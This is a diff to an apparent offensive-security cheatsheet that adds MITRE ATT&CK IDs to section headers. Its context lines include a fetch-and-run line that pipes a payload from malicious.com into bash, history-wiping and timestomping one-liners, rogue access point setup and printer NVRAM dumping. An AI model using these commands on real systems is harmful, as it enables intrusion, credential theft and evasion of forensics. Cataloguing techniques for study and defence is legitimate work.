@@ -1344,7 +1344,7 @@ $ tshark -r <pcap> 'ntlmssp.auth.username' | awk '{print $13}' | sort -u
 $ tshark -i <interface> 'ntlmssp.auth.username' | awk '{print $13}' | sort -u
 ```
 
-## IP Information
+## IP Information (T1016)
 
 ```bash
 #!/usr/bin/env bash
@@ -1369,7 +1369,7 @@ ipinfo () {
 ipinfo
 ```
 
-## Cloning Websites for Social Engineering with Wget
+## Cloning Websites for Social Engineering with Wget (T1189)
 
  ```
  wget --mirror --convert-links --adjust-extension --page-requisites --no-parent https://site-to-download.com
@@ -1385,7 +1385,7 @@ ipinfo
 --adjust-extension - adds the appropriate extensions (e.g. html, css, js) to files if they were retrieved without them.
 ```
 
-## Spidering the Web with Wget
+## Spidering the Web with Wget (T1213)
 
 ```
 export https_proxy=https://127.0.0.1:8080
@@ -1393,7 +1393,7 @@ export https_proxy=https://127.0.0.1:8080
 wget -r -P /tmp --no-check-certificate -e robots=off ‐‐recursive ‐‐no-parent http://example.com/
 ```
 
-## Hiding PID Listings From Non-Root Users
+## Hiding PID Listings From Non-Root Users (T1564)
 
 To prevent a user from seeing all the processes running on a system, mount the /proc file system using the hidepid=2 option:
 
@@ -1403,7 +1403,7 @@ $ sudo mount -o remount,rw,nosuid,nodev,noexec,relatime,hidepid=2 /proc
 # 2: Process files are invisible to non-root users. The existence of a process can be learned by other means, but its effective user ID (UID) and group ID (GID) are hidden.
 ```
 
-## Exporting Objects with Tshark
+## Exporting Objects with Tshark (T1040)
 
 To extract a file, read in a file, use the --export-objects flag and specify the protocol and directory to save the files. Without -Q, tshark will read packets and send to stdout even though it is exporting objects.
 
@@ -1421,7 +1421,7 @@ smb: Windows network share file
 tftp: Unsecured file
 ```
 
-## Rogue APs with Karmetasploit
+## Rogue APs with Karmetasploit (T1557.002)
 
 Karmetasploit is a great function within Metasploit, allowing you to fake access points, capture passwords, harvest data, and conduct browser attacks against clients.
 
@@ -1472,7 +1472,7 @@ root@RoseSecurity:~# msfconsole -q -r karma.rc_.txt
 
 At this point, we are up and running. All that is required now is for a client to connect to the fake access point. When they connect, they will see a fake ‘captive portal’ style screen regardless of what website they try to connect to. You can look through your output, and see that a wide number of different servers are started. From DNS, POP3, IMAP, to various HTTP servers, we have a wide net now cast to capture various bits of information.
 
-## Passive Fingerprinting with P0f
+## Passive Fingerprinting with P0f (T1040)
 
 Use interface eth0 (-i eth0) in promiscuous mode (-p), saving the results to a file (-o /tmp/p0f.log):
 
@@ -1497,7 +1497,7 @@ root@RoseSecurity:~# p0f -i eth0 -p -o /tmp/p0f.log
 | raw_sig  = 4:64+0:0:1460:mss*20,7:mss,sok,ts,nop,ws:df,id+:0
 ```
 
-## Advanced Mitm Attacks with Bettercap Filters
+## Advanced Mitm Attacks with Bettercap Filters (T1557)
 
 Display a message if the tcp port is 22:
 
@@ -1531,7 +1531,7 @@ if (ip.proto == TCP) {
 }
 ```
 
-## Rust Reverse Shell
+## Rust Reverse Shell (T1059)
 
 ```rust
 use std::net::TcpStream;
@@ -1552,7 +1552,7 @@ fn main() {
 }
 ```
 
-## Fake Sudo Program to Harvest Credentials
+## Fake Sudo Program to Harvest Credentials (T1056)
 
 Mimics legitimate Sudo binary to capture credentials and output to ```/tmp``` directory file.
 
@@ -1610,7 +1610,7 @@ int main( int argc, char *argv[] )
 }
 ```
 
-## TruffleHog GitHub Organizations
+## TruffleHog GitHub Organizations (T1552.001)
 
 Enumerate GitHub organizations for secrets and credentials
 
@@ -1618,7 +1618,7 @@ Enumerate GitHub organizations for secrets and credentials
 root@RoseSecurity# orgs=$(curl -s https://api.github.com/organizations | jq -r '.[] | .name'); for i in $orgs; do trufflehog github --org=$i; done
 ```
 
-## Bypass File System Protections (Read-Only and No-Exec) for Containers
+## Bypass File System Protections (Read-Only and No-Exec) for Containers (T1611)
 
 It's increasingly common to find Linux machines mounted with read-only (ro) file system protection, especially in containers. This is because running a container with `ro` file system is as easy as setting `readOnlyRootFilesystem: true` in the `securitycontext`:
 
@@ -1645,7 +1645,7 @@ However, even if the file system is mounted as `ro`, /dev/shm will still be writ
 wget -O- https://malicious.com/hacked.elf | base64 -w0 | bash ddexec.sh argv0 phone home
 ```
 
-## Dumping Printer NVRAM
+## Dumping Printer NVRAM (T1552)
 
 You can dump the NVRAM and extract confidential info (as passwords) by accessing arbitrary addresses using PJL:
 
@@ -1663,7 +1663,7 @@ Writing copy to nvram/printer
 ................................................................................
 ```
 
-## Slash Proc Magic
+## Slash Proc Magic (T1564.001)
 
 Victim Host:
 
@@ -1705,7 +1705,7 @@ ps aux | grep MALICIOUS
 
 By leveraging bind mounts to overlay a /proc/ directory, we demonstrated how a process can seemingly vanish from process listings while maintaining its functionality.
 
-## Linux Timestomping
+## Linux Timestomping (T1070.006)
 
 Timestomping is an anti-forensics technique which is used to modify the timestamps of a file, often to mimic files that are in the same folder.
 
@@ -1727,7 +1727,7 @@ Use the -r option and the file we want to inherit its access and modification ti
 touch -r normal.elf payload.elf
 ```
 
-## Linux Bash History Stomping
+## Linux Bash History Stomping (T1070.003)
 
 One-liner:
 
@@ -1737,7 +1737,7 @@ export HISTFILE=/dev/null; unset HISTFILESIZE; unset HISTSIZE
 
 Defenders can also enable timestamps in ```.bash_history``` using the command: ```export HISTTIMEFORMAT='%F %T '```
 
-## Taking Apart URL Shorteners with cURL
+## Taking Apart URL Shorteners with cURL (T1082)
 
 Ever get a "shortened" url (bit.ly, tinyurl.com or whatever) and stress about "clicking that link"?  Or worse yet, have that "Oh No" moment after you just clicked it? Let's use cURL to avoid this!
 
@@ -1752,7 +1752,7 @@ $ curl -k -v -I https://bit.ly/3ABvcy5 2>&1 | grep -i "< location" | cut -d " " 
 https://isc.sans.edu/
 ```
 
-## Email Spoofing PHP
+## Email Spoofing PHP (T1566)
 
 ```php
 <?php
@@ -1813,7 +1813,7 @@ if ($retval) {
 ?>
 ```
 
-## Linux SIEM Bypass
+## Linux SIEM Bypass (T1006)
 
 ```bash
 ┌──(root㉿kali)-[~]
